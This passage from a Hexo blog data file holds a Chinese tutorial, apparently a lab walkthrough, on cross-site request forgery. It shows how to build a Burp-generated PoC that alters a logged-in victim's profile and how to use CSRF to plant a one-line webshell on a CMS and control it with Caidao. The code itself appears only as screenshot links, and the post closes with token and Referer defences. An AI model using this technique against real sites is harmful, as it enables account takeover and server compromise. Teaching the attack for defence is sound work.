5Bobject%20Object%5D&originHeight=288&originWidth=931&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317577777-d9f0f503-a28b-4f2f-822b-42caf10fe7e9.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=755&originWidth=1342&status=done&style=none&width=415)\n5.通过burp抓取这个修改包，做成CSRF的poc\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317578303-f5676351-cfb0-459b-a596-d8dc8e1ec799.png#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&originHeight=863&originWidth=1704&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317578849-a5f906aa-3d34-4a14-9378-c5b320e8a8b7.png#align=left&display=inline&height=375&margin=%5Bobject%20Object%5D&originHeight=787&originWidth=871&status=done&style=none&width=415)\n6.这里我将代码存在CSRF.html\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317579367-678ec02a-3533-4bd7-b396-bece13463417.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&originHeight=421&originWidth=1191&status=done&style=none&width=416)\n7.接下来，我们需要社工，诱骗登录了该网站的受害者点击我们的链接，这里因为是演示，就直接拿我的管理员账号来试试了。首先看看我的admin1的账号信息，这里都是admin1\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317579884-76ddacfe-cb5a-4ead-93bc-a6aa3f7e701d.png#align=left&display=inline&height=216&margin=%5Bobject%20Object%5D&originHeight=835&originWidth=1601&status=done&style=none&width=415)\n8.登录了用户后，(也可以关闭该页面，cookie在登录之后是有一定的存在时间的)，在这个浏览器，访问poc的链接\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317580294-17a7df2a-59fa-4d4b-b163-26f164792b43.png#align=left&display=inline&height=139&margin=%5Bobject%20Object%5D&originHeight=278&originWidth=829&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317580878-91f8b916-affe-45c8-a056-d423965a1fae.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&originHeight=189&originWidth=705&status=done&style=none&width=415)\n9.点击按钮之后，回去看我的账号信息，已经变成了刚刚我做成的poc的内容\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317582113-1a84b1d7-d28f-4b7f-abe8-85c8ad0c180e.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&originHeight=727&originWidth=1295&status=done&style=none&width=416)\n\n这就是简单的CSRF的功能，看着好像危害不大的样子，那么接下来让大家看看，通过CSRF来getshell。\n\n# 0x06 通过CSRF来getshell\n\n## 1、什么是shell？\nshell就是一个脚本文件，我们通过这个脚本文件来管理或者控制服务器的文件、数据库等信息。\n## 2、如何getshell？\n目的是将脚本文件上传到服务器，并让服务器解析。脚本文件可以是asp、php、jsp等。\n\n## 3、流程\n\n1.首先打开我本机上的某cms的后台\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317582636-ffccb573-3a21-4b5a-88c3-6d6162562111.png#align=left&display=inline&height=231&margin=%5Bobject%20Object%5D&originHeight=696&originWidth=1256&status=done&style=none&width=416)\n\n\n2.通过上传一句话木马构造CSRFpoc\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317583155-5333caa9-9546-4baa-9017-ffeca88fda3c.png#align=left&display=inline&height=177&margin=%5Bobject%20Object%5D&originHeight=671&originWidth=1580&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317583689-637dfc12-9278-4ddc-8a7a-afecfe13d07b.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&originHeight=675&originWidth=940&status=done&style=none&width=415)\n\n3.将poc保存为html文件，这里我进行了一些配置，设置页面为打开直接自动点击。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317584018-ca75c982-737a-41a2-8a22-c05aed0a2f4e.png#align=left&display=inline&height=175&margin=%5Bobject%20Object%5D&originHeight=703&originWidth=1920&status=done&style=none&width=477)\n4.到靶机处，登录它的网站，可以看到，这个网站的ip为靶机的，这个网站与我构造poc  的网站不是同一个。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317584541-63e6ebf9-7b18-43b8-8134-b5d40d4b90cb.png#align=left&display=inline&height=245&margin=%5Bobject%20Object%5D&originHeight=749&originWidth=1270&status=done&style=none&width=415)\n5.接下来，通过靶机访问构造好的html\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317585031-bbcac406-020f-4caa-a996-7ce4857b9d46.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=384&originWidth=1164&status=done&style=none&width=416)\n6.点击之后，一闪而过了保存文件的界面之后跳出了文件管理器，看到IP知道文件已经保存成功了。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317585542-404664fc-7061-4812-a95f-8ffff4562569.png#align=left&display=inline&height=184&margin=%5Bobject%20Object%5D&originHeight=568&originWidth=1280&status=done&style=none&width=415)\n还是验证一下吧，回去之前那个页面刷新后发现确实保存成功了\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317586014-06a09b2f-9033-4715-a5d2-20a7dc0a4e97.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=761&originWidth=1273&status=done&style=none&width=415)\n7.现在也就是说我已经将木马文件放到对方的服务器上了，接下来回到本机，连接菜刀，拿下服务器\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317586564-9db664a5-45ff-497f-a00b-7024fd2d4a17.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1625&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317587075-2f880b21-12a0-4fc7-91e5-9803851f01ff.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1625&status=done&style=none&width=416)\n\n# 0x07 防御CSRF\n1.验证 HTTP Referer 字段\n根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。这种验证方法通过查看referer来验证CSRF攻击的数据包是否是用户自己的操作，当然因为可以伪造referer，所以现在比较没有那么流行。\n2.Token机制\n可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。一般为了预防CSRF或者其他攻击，都能够在抓包处发现存在token字段，有的是get传参，有的是post传参。token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，如果token一样，则执行操作，token不一样就不予执行。\n3.在 HTTP 头中自定义属性并验证\n\n# 0x08 总结思考\nCSRF漏洞因为需要受害者点击才能够触发，所以经常不被重视，但是正是这种情况下，CSRF能够造成的危害会比想象中要大。嗯嗯，社会工程学就是高端的欺骗，具体可以百度学习一下。本篇文章就到这里了，对于实验中的环境，工具，有需要的可以添加我的微信获取。\n","slug":"被忽视的漏洞-CSRF跨站请求伪造","published":1,"updated":"2021-08-07T16:16:24.648Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfp001kvkq30l5p1owy","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h1><p>几天前，有位师傅联系我询问CSRF的事，最近也刚好在学习CSRF，就弄出一篇文章出来吧。CSRF在我眼里，真的是被大家低估了的漏洞，配合好社会工程学的话，我觉得在现在大家对于sql注入，xss，文件上传的防护都很重视的情况下，CSRF能够造成意想不到的效果。<br>CSRF简介<br>CSRF（<strong>跨站请求伪造</strong>），是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟<a href=\"https://baike.baidu.com/item/%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC\">跨网站脚本</a>（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>\n<h1 id=\"0x02-Cookie\"><a href=\"#0x02-Cookie\" class=\"headerlink\" title=\"0x02 Cookie\"></a>0x02 Cookie</h1><p>这里需要了解一个概念，cookie，一串字符串，是网站辨别用户的标识，也可以这样理解，拿到了某用户在某网站的cookie，我就可以登录他在那个网站的账号。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317575665-8a8af458-2a41-42ba-ab39-dc1b0ccb3997.png#align=left&display=inline&height=193&margin=%5Bobject%20Object%5D&originHeight=822&originWidth=1764&status=done&style=none&width=415\"><br>这里扯一嘴，偷取cookie是XSS做的事，CSRF的作用是借用cookie，并不能获取cookie。</p>\n<h1 id=\"0x03-CSRF原理\"><a href=\"#0x03-CSRF原理\" class=\"headerlink\" title=\"0x03 CSRF原理\"></a>0x03 CSRF原理</h1><p>接下来进行CSRF的讲解，我是这样理解CSRF的，它通过构造一个poc，让已经登录某网站的用户访问，这个poc便会以该用户的cookie来操作网站，对于那个受害者来说，他点击了我的链接，浏览器就偷偷进行了一些操作。</p>\n<h1 id=\"0x04-危害\"><a href=\"#0x04-危害\" class=\"headerlink\" title=\"0x04 危害\"></a>0x04 危害</h1><p>攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>\n<h1 id=\"0x05-检测CSRF漏洞\"><a href=\"#0x05-检测CSRF漏洞\" class=\"headerlink\" title=\"0x05 检测CSRF漏洞\"></a>0x05 检测CSRF漏洞</h1><p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。当然也可以像我这样，看看有没有Token字段，没有就先认为存在。（Token是一种防御CSRF的机制，也是目前使用相对较好的防御方法，会在后面进行解释）</p>\n<p>通过CSRF 修改受害者的个人信息<br>1.首先打开靶场<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576172-fdae19b7-7517-4745-bbd1-d3108537ec73.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&originHeight=902&originWidth=1920&status=done&style=none&width=416\"><br>2.注册一个新用户<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576618-3c455c98-0ccd-4585-935a-026da67cd7aa.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&originHeight=902&originWidth=1920&status=done&style=none&width=416\"><br>3.这是注册成功后的界面，可以看到有个用户管理<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576852-50d8a2b8-4766-4030-acd6-4f25e300c97f.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&originHeight=735&originWidth=1669&status=done&style=none&width=416\"></p>\n<p>4.点击我的个人资料，对于我的账号进行一些修改<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317577219-a78ec569-bb05-4d57-a4bb-f211c4f3a77c.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=288&originWidth=931&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317577777-d9f0f503-a28b-4f2f-822b-42caf10fe7e9.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=755&originWidth=1342&status=done&style=none&width=415\"><br>5.通过burp抓取这个修改包，做成CSRF的poc<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317578303-f5676351-cfb0-459b-a596-d8dc8e1ec799.png#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&originHeight=863&originWidth=1704&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317578849-a5f906aa-3d34-4a14-9378-c5b320e8a8b7.png#align=left&display=inline&height=375&margin=%5Bobject%20Object%5D&originHeight=787&originWidth=871&status=done&style=none&width=415\"><br>6.这里我将代码存在CSRF.html<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317579367-678ec02a-3533-4bd7-b396-bece13463417.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&originHeight=421&originWidth=1191&status=done&style=none&width=416\"><br>7.接下来，我们需要社工，诱骗登录了该网站的受害者点击我们的链接，这里因为是演示，就直接拿我的管理员账号来试试了。首先看看我的admin1的账号信息，这里都是admin1<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317579884-76ddacfe-cb5a-4ead-93bc-a6aa3f7e701d.png#align=left&display=inline&height=216&margin=%5Bobject%20Object%5D&originHeight=835&originWidth=1601&status=done&style=none&width=415\"><br>8.登录了用户后，(也可以关闭该页面，cookie在登录之后是有一定的存在时间的)，在这个浏览器，访问poc的链接<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317580294-17a7df2a-59fa-4d4b-b163-26f164792b43.png#align=left&display=inline&height=139&margin=%5Bobject%20Object%5D&originHeight=278&originWidth=829&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317580878-91f8b916-affe-45c8-a056-d423965a1fae.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&originHeight=189&originWidth=705&status=done&style=none&width=415\"><br>9.点击按钮之后，回去看我的账号信息，已经变成了刚刚我做成的poc的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317582113-1a84b1d7-d28f-4b7f-abe8-85c8ad0c180e.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&originHeight=727&originWidth=1295&status=done&style=none&width=416\"></p>\n<p>这就是简单的CSRF的功能，看着好像危害不大的样子，那么接下来让大家看看，通过CSRF来getshell。</p>\n<h1 id=\"0x06-通过CSRF来getshell\"><a href=\"#0x06-通过CSRF来getshell\" class=\"headerlink\" title=\"0x06 通过CSRF来getshell\"></a>0x06 通过CSRF来getshell</h1><h2 id=\"1、什么是shell？\"><a href=\"#1、什么是shell？\" class=\"headerlink\" title=\"1、什么是shell？\"></a>1、什么是shell？</h2><p>shell就是一个脚本文件，我们通过这个脚本文件来管理或者控制服务器的文件、数据库等信息。</p>\n<h2 id=\"2、如何getshell？\"><a href=\"#2、如何getshell？\" class=\"headerlink\" title=\"2、如何getshell？\"></a>2、如何getshell？</h2><p>目的是将脚本文件上传到服务器，并让服务器解析。脚本文件可以是asp、php、jsp等。</p>\n<h2 id=\"3、流程\"><a href=\"#3、流程\" class=\"headerlink\" title=\"3、流程\"></a>3、流程</h2><p>1.首先打开我本机上的某cms的后台<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317582636-ffccb573-3a21-4b5a-88c3-6d6162562111.png#align=left&display=inline&height=231&margin=%5Bobject%20Object%5D&originHeight=696&originWidth=1256&status=done&style=none&width=416\"></p>\n<p>2.通过上传一句话木马构造CSRFpoc<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317583155-5333caa9-9546-4baa-9017-ffeca88fda3c.png#align=left&display=inline&height=177&margin=%5Bobject%20Object%5D&originHeight=671&originWidth=1580&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317583689-637dfc12-9278-4ddc-8a7a-afecfe13d07b.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&originHeight=675&originWidth=940&status=done&style=none&width=415\"></p>\n<p>3.将poc保存为html文件，这里我进行了一些配置，设置页面为打开直接自动点击。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317584018-ca75c982-737a-41a2-8a22-c05aed0a2f4e.png#align=left&display=inline&height=175&margin=%5Bobject%20Object%5D&originHeight=703&originWidth=1920&status=done&style=none&width=477\"><br>4.到靶机处，登录它的网站，可以看到，这个网站的ip为靶机的，这个网站与我构造poc  的网站不是同一个。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317584541-63e6ebf9-7b18-43b8-8134-b5d40d4b90cb.png#align=left&display=inline&height=245&margin=%5Bobject%20Object%5D&originHeight=749&originWidth=1270&status=done&style=none&width=415\"><br>5.接下来，通过靶机访问构造好的html<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317585031-bbcac406-020f-4caa-a996-7ce4857b9d46.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=384&originWidth=1164&status=done&style=none&width=416\"><br>6.点击之后，一闪而过了保存文件的界面之后跳出了文件管理器，看到IP知道文件已经保存成功了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317585542-404664fc-7061-4812-a95f-8ffff4562569.png#align=left&display=inline&height=184&margin=%5Bobject%20Object%5D&originHeight=568&originWidth=1280&status=done&style=none&width=415\"><br>还是验证一下吧，回去之前那个页面刷新后发现确实保存成功了<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317586014-06a09b2f-9033-4715-a5d2-20a7dc0a4e97.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=761&originWidth=1273&status=done&style=none&width=415\"><br>7.现在也就是说我已经将木马文件放到对方的服务器上了，接下来回到本机，连接菜刀，拿下服务器<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317586564-9db664a5-45ff-497f-a00b-7024fd2d4a17.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1625&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317587075-2f880b21-12a0-4fc7-91e5-9803851f01ff.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1625&status=done&style=none&width=416\"></p>\n<h1 id=\"0x07-防御CSRF\"><a href=\"#0x07-防御CSRF\" class=\"headerlink\" title=\"0x07 防御CSRF\"></a>0x07 防御CSRF</h1><p>1.验证 HTTP Referer 字段<br>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。这种验证方法通过查看referer来验证CSRF攻击的数据包是否是用户自己的操作，当然因为可以伪造referer，所以现在比较没有那么流行。<br>2.Token机制<br>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。一般为了预防CSRF或者其他攻击，都能够在抓包处发现存在token字段，有的是get传参，有的是post传参。token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，如果token一样，则执行操作，token不一样就不予执行。<br>3.在 HTTP 头中自定义属性并验证</p>\n<h1 id=\"0x08-总结思考\"><a href=\"#0x08-总结思考\" class=\"headerlink\" title=\"0x08 总结思考\"></a>0x08 总结思考</h1><p>CSRF漏洞因为需要受害者点击才能够触发，所以经常不被重视，但是正是这种情况下，CSRF能够造成的危害会比想象中要大。嗯嗯，社会工程学就是高端的欺骗，具体可以百度学习一下。本篇文章就到这里了，对于实验中的环境，工具，有需要的可以添加我的微信获取。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h1><p>几天前，有位师傅联系我询问CSRF的事，最近也刚好在学习CSRF，就弄出一篇文章出来吧。CSRF在我眼里，真的是被大家低估了的漏洞，配合好社会工程学的话，我觉得在现在大家对于sql注入，xss，文件上传的防护都很重视的情况下，CSRF能够造成意想不到的效果。<br>CSRF简介<br>CSRF（<strong>跨站请求伪造</strong>），是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟<a href=\"https://baike.baidu.com/item/%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC\">跨网站脚本</a>（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>\n<h1 id=\"0x02-Cookie\"><a href=\"#0x02-Cookie\" class=\"headerlink\" title=\"0x02 Cookie\"></a>0x02 Cookie</h1><p>这里需要了解一个概念，cookie，一串字符串，是网站辨别用户的标识，也可以这样理解，拿到了某用户在某网站的cookie，我就可以登录他在那个网站的账号。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317575665-8a8af458-2a41-42ba-ab39-dc1b0ccb3997.png#align=left&display=inline&height=193&margin=%5Bobject%20Object%5D&originHeight=822&originWidth=1764&status=done&style=none&width=415\"><br>这里扯一嘴，偷取cookie是XSS做的事，CSRF的作用是借用cookie，并不能获取cookie。</p>\n<h1 id=\"0x03-CSRF原理\"><a href=\"#0x03-CSRF原理\" class=\"headerlink\" title=\"0x03 CSRF原理\"></a>0x03 CSRF原理</h1><p>接下来进行CSRF的讲解，我是这样理解CSRF的，它通过构造一个poc，让已经登录某网站的用户访问，这个poc便会以该用户的cookie来操作网站，对于那个受害者来说，他点击了我的链接，浏览器就偷偷进行了一些操作。</p>\n<h1 id=\"0x04-危害\"><a href=\"#0x04-危害\" class=\"headerlink\" title=\"0x04 危害\"></a>0x04 危害</h1><p>攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>\n<h1 id=\"0x05-检测CSRF漏洞\"><a href=\"#0x05-检测CSRF漏洞\" class=\"headerlink\" title=\"0x05 检测CSRF漏洞\"></a>0x05 检测CSRF漏洞</h1><p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。当然也可以像我这样，看看有没有Token字段，没有就先认为存在。（Token是一种防御CSRF的机制，也是目前使用相对较好的防御方法，会在后面进行解释）</p>\n<p>通过CSRF 修改受害者的个人信息<br>1.首先打开靶场<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576172-fdae19b7-7517-4745-bbd1-d3108537ec73.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&originHeight=902&originWidth=1920&status=done&style=none&width=416\"><br>2.注册一个新用户<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576618-3c455c98-0ccd-4585-935a-026da67cd7aa.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&originHeight=902&originWidth=1920&status=done&style=none&width=416\"><br>3.这是注册成功后的界面，可以看到有个用户管理<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317576852-50d8a2b8-4766-4030-acd6-4f25e300c97f.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&originHeight=735&originWidth=1669&status=done&style=none&width=416\"></p>\n<p>4.点击我的个人资料，对于我的账号进行一些修改<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317577219-a78ec569-bb05-4d57-a4bb-f211c4f3a77c.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=288&originWidth=931&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317577777-d9f0f503-a28b-4f2f-822b-42caf10fe7e9.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=755&originWidth=1342&status=done&style=none&width=415\"><br>5.通过burp抓取这个修改包，做成CSRF的poc<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317578303-f5676351-cfb0-459b-a596-d8dc8e1ec799.png#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&originHeight=863&originWidth=1704&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317578849-a5f906aa-3d34-4a14-9378-c5b320e8a8b7.png#align=left&display=inline&height=375&margin=%5Bobject%20Object%5D&originHeight=787&originWidth=871&status=done&style=none&width=415\"><br>6.这里我将代码存在CSRF.html<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317579367-678ec02a-3533-4bd7-b396-bece13463417.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&originHeight=421&originWidth=1191&status=done&style=none&width=416\"><br>7.接下来，我们需要社工，诱骗登录了该网站的受害者点击我们的链接，这里因为是演示，就直接拿我的管理员账号来试试了。首先看看我的admin1的账号信息，这里都是admin1<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317579884-76ddacfe-cb5a-4ead-93bc-a6aa3f7e701d.png#align=left&display=inline&height=216&margin=%5Bobject%20Object%5D&originHeight=835&originWidth=1601&status=done&style=none&width=415\"><br>8.登录了用户后，(也可以关闭该页面，cookie在登录之后是有一定的存在时间的)，在这个浏览器，访问poc的链接<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317580294-17a7df2a-59fa-4d4b-b163-26f164792b43.png#align=left&display=inline&height=139&margin=%5Bobject%20Object%5D&originHeight=278&originWidth=829&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317580878-91f8b916-affe-45c8-a056-d423965a1fae.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&originHeight=189&originWidth=705&status=done&style=none&width=415\"><br>9.点击按钮之后，回去看我的账号信息，已经变成了刚刚我做成的poc的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317582113-1a84b1d7-d28f-4b7f-abe8-85c8ad0c180e.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&originHeight=727&originWidth=1295&status=done&style=none&width=416\"></p>\n<p>这就是简单的CSRF的功能，看着好像危害不大的样子，那么接下来让大家看看，通过CSRF来getshell。</p>\n<h1 id=\"0x06-通过CSRF来getshell\"><a href=\"#0x06-通过CSRF来getshell\" class=\"headerlink\" title=\"0x06 通过CSRF来getshell\"></a>0x06 通过CSRF来getshell</h1><h2 id=\"1、什么是shell？\"><a href=\"#1、什么是shell？\" class=\"headerlink\" title=\"1、什么是shell？\"></a>1、什么是shell？</h2><p>shell就是一个脚本文件，我们通过这个脚本文件来管理或者控制服务器的文件、数据库等信息。</p>\n<h2 id=\"2、如何getshell？\"><a href=\"#2、如何getshell？\" class=\"headerlink\" title=\"2、如何getshell？\"></a>2、如何getshell？</h2><p>目的是将脚本文件上传到服务器，并让服务器解析。脚本文件可以是asp、php、jsp等。</p>\n<h2 id=\"3、流程\"><a href=\"#3、流程\" class=\"headerlink\" title=\"3、流程\"></a>3、流程</h2><p>1.首先打开我本机上的某cms的后台<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317582636-ffccb573-3a21-4b5a-88c3-6d6162562111.png#align=left&display=inline&height=231&margin=%5Bobject%20Object%5D&originHeight=696&originWidth=1256&status=done&style=none&width=416\"></p>\n<p>2.通过上传一句话木马构造CSRFpoc<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317583155-5333caa9-9546-4baa-9017-ffeca88fda3c.png#align=left&display=inline&height=177&margin=%5Bobject%20Object%5D&originHeight=671&originWidth=1580&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317583689-637dfc12-9278-4ddc-8a7a-afecfe13d07b.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&originHeight=675&originWidth=940&status=done&style=none&width=415\"></p>\n<p>3.将poc保存为html文件，这里我进行了一些配置，设置页面为打开直接自动点击。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317584018-ca75c982-737a-41a2-8a22-c05aed0a2f4e.png#align=left&display=inline&height=175&margin=%5Bobject%20Object%5D&originHeight=703&originWidth=1920&status=done&style=none&width=477\"><br>4.到靶机处，登录它的网站，可以看到，这个网站的ip为靶机的，这个网站与我构造poc  的网站不是同一个。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317584541-63e6ebf9-7b18-43b8-8134-b5d40d4b90cb.png#align=left&display=inline&height=245&margin=%5Bobject%20Object%5D&originHeight=749&originWidth=1270&status=done&style=none&width=415\"><br>5.接下来，通过靶机访问构造好的html<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317585031-bbcac406-020f-4caa-a996-7ce4857b9d46.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=384&originWidth=1164&status=done&style=none&width=416\"><br>6.点击之后，一闪而过了保存文件的界面之后跳出了文件管理器，看到IP知道文件已经保存成功了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317585542-404664fc-7061-4812-a95f-8ffff4562569.png#align=left&display=inline&height=184&margin=%5Bobject%20Object%5D&originHeight=568&originWidth=1280&status=done&style=none&width=415\"><br>还是验证一下吧，回去之前那个页面刷新后发现确实保存成功了<br><img 